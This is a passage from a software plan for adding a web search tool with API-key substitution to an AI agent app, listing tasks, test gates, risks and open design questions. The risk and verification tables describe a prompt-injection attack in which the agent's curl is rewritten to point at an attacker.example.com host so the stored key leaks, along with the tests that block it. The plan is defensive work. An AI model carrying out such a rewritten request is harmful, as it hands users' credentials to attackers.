- [ ] **Task 5 — Rewrite the tool module + schemas.**
  Delete the `bash.zig` import and `execute_bash` call; delete `WebSearchInput`/`WebSearchResult` from `schemas.zig:100-117`; write `web_search_tool` with exactly the two properties `{provider, curl}` and a verbose `.description` in the `generate_image.zig:109-137` style, including the worked TinyFish example with `{key}` in place (D12). **The description must not list providers, URLs, or hint at keys** — the model has no business knowing the provider set, and the schema ships to every provider's LLM.
  Verify: `zig build test --summary all`; grep that no file references the deleted `schemas.WebSearchResult`.
  Commit: `refactor(web-search): replace the URL-browser shim with the real search tool`

- [ ] **Task 6 — `web_search_config.zig` + the prompt section (D14, D15).**
  `resolve(allocator, db, session_id) ?WebSearchProviders` mirroring `skill_evals_config.resolve` (`:41-56`) — narrow parse struct, `ignore_unknown_fields`, `user_config_store.loadRaw`, `null` for every non-authoritative case. Then `renderPromptSection`, gated on `hasTool(filtered_tools, "web_search")` in `buildMessages`, copying the `:97`/`:101` pattern. Renders each enabled provider's `curl` verbatim with `{key}` intact.
  **Tests:** (a) the rendered block contains `{key}` and **not** the key value; (b) it is empty when the tool is not equipped; (c) it is empty in auth mode for a session with no saved config; (d) a provider whose `curl` fails to parse is skipped with a name-only `warn`, not a crash.
  Verify: `zig build test --summary all`, plus a manual read of the rendered prompt for a two-provider config.
  Commit: `feat(web-search): per-session config resolution + provider prompt section`

- [ ] **Task 7 — Exec adapter + registry + config handlers.**
  Rewrite `tools_exec_web_search.zig` to read **`web_search_config.resolve(ctx.allocator, ctx.db, ctx.session_id)`, not `ctx.config`** (D15); uncomment and rewrite `tools_equipped.zig:306`; add to `equips()` (`:78`) and `DEFAULT_AGENT_TOOLS` (`:331`) per D10. **Add a guard test asserting every name in `equips()` resolves to a registry entry** — the gap that made this tool invisible. Wire `web_search` into **both** `nalar_config_get.zig` branches (`:59-81`, `:143-174`) with masking, and add `applyWebSearchInput` beside `applyToolsInput` (`nalar_config_put.zig:192`).
  Verify: `zig build test --summary all`; the guard test **fails** when `:306` is temporarily re-commented — prove it, because a guard that cannot fail is not a guard.
  Commit: `feat(web-search): register the tool, parity guard test, and config handlers`

- [ ] **Task 8 — Settings section (D11).**
  `WebSearchSection.vue` — rows of name / URL / masked key / enabled toggle; key input is `type="password"` and a masked value round-trips without blanking the stored key. `NalarConfig.web_search` in `api/index.ts`. Mounted beside `McpServersSection` (`NalarSettings.vue:876`).
  Verify: `(cd src/apps/desktop && pnpm run build)` clean; a vitest spec asserting (a) submitting the mask does not blank the key and (b) a `http://` URL surfaces the backend's rejection message rather than a generic failure.
  Commit: `feat(web-search): Settings → Web Search providers`

- [ ] **Task 9 — Tool output rendering + Android card.**
  `parseWebSearch` + `ParsedWebSearch`, `WebSearch.vue`, the `renderResponse.ts:212-220` decision, Android `ToolCardModel.kt:565-572` + its test case.
  Verify: `pnpm test:unit` in `src/apps/desktop`; the Android unit-test task.
  Commit: `feat(web-search): render results in the desktop + Android tool card`

- [ ] **Task 10 — Functional test.**
  `tests/functional/web_search_config_test.py`: PUT a two-provider map, GET it back, assert it round-trips and the keys come back **masked**; assert a `http://` or `169.254.x` `url` is rejected with a 400. This is the layer where empty-slice and route-order failures are visible.
  Verify: `zig build install:linux && NALAR_BIN=$(pwd)/zig-out/bin/nalarcore-linux-x86_64 python3 -m pytest tests/functional/web_search_config_test.py -v` — on a harness port, never 8081.
  Commit: `test(web-search): config round-trip, key masking, and URL validation on the wire`

- [ ] **Task 11 — Docs + stale-reference sweep.**
  Correct `2026-08-06-show-preview-local-file.md:110`. Sweep `2026-08-14-pwsh-tool.md:35`, `:1327`, `:1339` and `2026-09-18-agent-tool-output-json-schema.md:121` for surviving claims that `web_search` browses a URL — historical lines stay, live claims get corrected. Document the config format and the `{key}` marker prominently, including the note that `{key}` in a URL query can appear in provider-side logs (D4). Also correct the stale `Agent.zig:1799-1821` reference in `generate_image.zig:546` — that range now holds message-handling code, not the scheme check (which lives at `Agent.zig:2939`).
  Commit: `docs(web-search): correct stale references and document the config format`

## Verification

| Gate | Command | What it proves |
|---|---|---|
| Zig unit | `zig build test --summary all` | Parser table, pinning, substitution, every envelope, key-hygiene source contract, sentinel non-leak, equip↔registry parity |
| **Host-pin (negative)** | a test calling `execute_web_search` with the TinyFish provider and an `attacker.example.com` curl, sentinel key set | Returns `host_mismatch`; the sentinel appears in **no** output; no request is attempted. This is the gate for the one blocking risk. |
| Equip parity (negative) | comment out `tools_equipped.zig:306`, re-run | The guard test fails — the bug that made this tool invisible |
| Key hygiene | the `SENTINEL_SECRET_DO_NOT_LEAK` test | No envelope, on any path, carries the key |
| **Prompt leak** | assert the rendered `## Web Search Providers` block contains `{key}` and **not** the key value | The section can be injected into the model's context on every iteration; it must be inert by construction |
| **Prompt/tool agreement** | render the block for a session, then dispatch against the same session | Both read `web_search_config.resolve`; a test that renders from one source and dispatches from another is the D15 trap repeating |
| **Tool-absent silence** | assert the block is empty when `web_search` is not equipped | `hasTool` gate works; no tokens spent describing an unavailable tool |
| Frontend types | `(cd src/apps/desktop && pnpm run build)` | `vue-tsc` clean; no stray emitted `.js` |
| Frontend unit | `(cd src/apps/desktop && pnpm test:unit)` | `WebSearch.vue`, `parseWebSearch`, `WebSearchSection.vue`, mask round-trip |
| Android unit | the `ToolCardModelTest` task | The `ToolKind.WebSearch` mapping |
| Functional (wire) | `zig build install:linux` then `NALAR_BIN=$(pwd)/zig-out/bin/nalarcore-linux-x86_64 python3 -m pytest tests/functional/web_search_config_test.py -v` | The map round-trips through the real `PUT`/`GET`, keys come back masked, a bad `url` 400s usefully |
| No-regression | the full set on the branch **and** on `origin/main` | Separates pre-existing failures; CI has an open `fix ci main zig build` card |
| Manual (human) | add TinyFish with a real key, then ask the agent "search for the latest FIFA World Cup news"; then paste a deliberately mismatched curl and confirm it is refused | The only proof of the live path, and the live proof that the pin holds |

**Known-unprovable in CI:** real quota exhaustion needs a real exhausted account, so the exhaustion envelope is covered by a unit test replaying a recorded 429 body. Stated plainly rather than implied.

## Out of Scope

- **Automatic provider fallback inside one tool call.** D8 explains why the model does it instead.
- **POST-based search APIs.** D6 is GET-only. POST would mean templating a request body too.
- **Response-shape adapters per provider.** The parser is generic; the response parser assumes the common `{results: [{title, url, snippet, site_name}]}` shape. A different shape parses but yields empty results.
- **A per-provider count cap on the prompt block.** D14 notes the token cost; capping the rendered list is the escape hatch if someone configures ten providers, but it is not built now.
- **Keychain / OS secret storage.** D11 masks on the wire; the key is still plaintext at rest, exactly like LLM keys today.
- **Widening D11 to LLM profile keys.** Deliberately separate.
- **A `web_fetch` / URL-reader tool.** See D1.
- **A DB migration.** Config lives in `config_json`; Migration 100 is not needed.
- **Touching `build_agent_prompt`.** It has no production caller (only 8 test call sites in `prompts.zig`); the live assembly is `buildMessages` at `:74`. Do not add a parameter to the dead one.
- **Android search UI beyond the tool card.**
- **Progressive-tool catalogue.** `progressive_catalog.zig` / `tool_eligibility.zig` need no entry (verified: neither mentions `web_search`).

## Open Questions for the reviewer

1. **D3 — host pinning is mandatory, but is exact-host-match the right rule?** An alternative is prefix/suffix matching (`*.search.tinyfish.ai`) for providers on a wildcard domain. **My recommendation: exact match**, with a clear error — a user who needs a wildcard can widen it deliberately later.
1b. **D14 — is a ~150-token-per-provider system-prompt section acceptable, every iteration?** With one provider, yes. If you expect users to configure many, we should cap the rendered list. **My recommendation: ship it uncapped and watch.**
1c. **Should the model still write the `curl` back, or should the backend apply a `{query}` placeholder to the stored template?** The first is maximally flexible (the model can vary `location`, `language`, `count`, or any provider-specific parameter without a config change); the second is cheaper and cannot be malformed. **My recommendation: keep the model's echo**, since flexibility is the point — but this is the single biggest open design question in the plan.
2. **D10 — default-on or default-off?** Default-on costs a `web_search` schema in every new agent's `tools[]`. **My recommendation: default-on**, consistent with `ask_user` and `search_tool`.
3. **D12 — is a model-authored curl on every call acceptable?** It costs tokens and the model will occasionally emit a malformed one. The mitigations are a worked example plus actionable errors. Would you rather the backend also accept a simplified `{provider, query}` form that fills in the URL and query param itself? That is strictly less flexible but much cheaper — it needs one extra field per config entry.
4. **D4 — should a `{key}` in the URL query be allowed at all?** It is required by SerpApi and Google CSE. **My recommendation: allow, and warn in the docs.**
5. **D8 — is model-driven fallback good enough, or should the backend keep a per-provider curl so it can retry itself?** Retrying itself costs a second transport field in config and reintroduces the duplication this revision removed.

## Risks

| Risk | Severity | Mitigation |
|---|---|---|
| **`ctx.config.web_search` is empty in `--auth` mode** — the singleton never sees what the user saved, so the tool reports "not configured" while Settings looks correct | **Critical** | **D15.** `web_search_config.resolve(allocator, db, session_id)` mirroring `skill_evals_config.zig:41-56`; used by both the prompt renderer and the exec adapter. This trap already shipped once in this codebase |
| **The model guesses the API** because nothing told it the header name / query param — the exact hole the reviewer caught | High | **D14.** The backend renders each provider's `curl` template into the prompt, gated on `hasTool`. Templates carry `{key}`, so injecting them is safe |
| **Credential exfiltration** — a prompt injection rewrites the curl to point at an attacker host while keeping `{key}`, and the backend hands over the real key | **Critical** | **D3 host pinning, enforced before the key is read.** A dedicated negative gate runs exactly this attack and asserts no request is attempted and the sentinel never appears |
| **CR/LF in a parsed header value** smuggles a second header | High | Task 2 rejects CR/LF in every parsed name and value, at parse time |
| **The key leaks into `llm_history`** | High | D7's sentinel test + a source-contract test forbidding `allocPrint` over the key + a grep review gate on the diff |
| **Only one `nalar_config_get.zig` allowlist branch is edited** — works in auth mode, silently drops keys elsewhere | High | Task 6 names both ranges; the functional test asserts the masked key is present on GET |
| **The model emits a malformed curl**, failing searches that a simpler schema would not | Medium | D12's worked example, plus errors that name the fix; Open Question 3 offers the cheaper schema |
| **The model does not retry on exhaustion**, so the user sees a quota error with no automatic rescue | Medium | D8's `other_providers` names and URLs make the retry constructible; accepted trade-off |
| **A pinned `url` is itself misconfigured** to a private/loopback host | Medium | D3 step 4 rejects non-`https` and private ranges at both PUT and execution time |
| **Only the registry/equip drift** — the name reaches the model and dispatches nowhere, rendering as a hung tool | High | Already happened once (`:306`). The parity guard test exists for this and is verified negative |
| **Exhaustion pattern misses**, so a real 429 is reported generically | Medium | D9's status-first rule catches a bare `429` regardless of body; the pattern only adds the `401`/`403` cases |
| **A provider's response shape differs** and parses to zero results with no error | Medium | Out of scope, stated in D13; `total_results: 0` plus the `provider` field makes it diagnosable |
| **The key travels to the browser in cleartext**, matching today's LLM-key behaviour | Medium | D11 masks it. Stated plainly rather than silently accepted |
| **A `{key}` in a URL query reaches provider-side access logs** | Low | D4 — inherent to those APIs; documented |
| **D10's prompt-cost regression turns out to matter** | Low | Reversible by removing one line from `DEFAULT_AGENT_TOOLS` + `BUILTIN_DEFAULT_TOOLS`; no migration either way |

## Plan saved checklist

- [x] Plan written and committed inside the worktree branch
- [x] PR opened against `main` with Goal / design decisions / task table / traps closed
- [x] Every load-bearing fact carries a `path:line` verified first-hand in this worktree
- [ ] User reviewed before execution
